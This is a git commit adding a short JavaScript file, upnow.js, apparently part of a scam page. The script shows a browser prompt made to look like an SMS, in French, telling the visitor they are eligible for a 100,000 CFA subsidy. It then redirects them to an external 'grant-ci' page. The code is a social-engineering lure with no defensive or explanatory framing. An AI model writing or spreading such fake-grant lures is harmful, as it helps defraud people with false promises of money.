830f093c2e09a285b8dfc09b913929fdc2be0161
everylinks <Joeyjosh60@gmail.com>
2024-12-23 23:55:02 +0100

    Create upnow.js

---
+++ upnow.js
@@ -0,0 +1,6 @@
+
+var password = 'OBTENEZ 100,000 CFA'
+password=prompt('SMS :Congratulations Vous êtes éligible à une subvention de 100,000 CFA, veuillez appuyer sur OK pour obtenir la vôtre  ','OBTENEZ 100,000 CFA');
+if (password != 'OBTENEZ 100,000 CFA') {
+location.href='https://everylinks.github.io/grant-ci';
+}
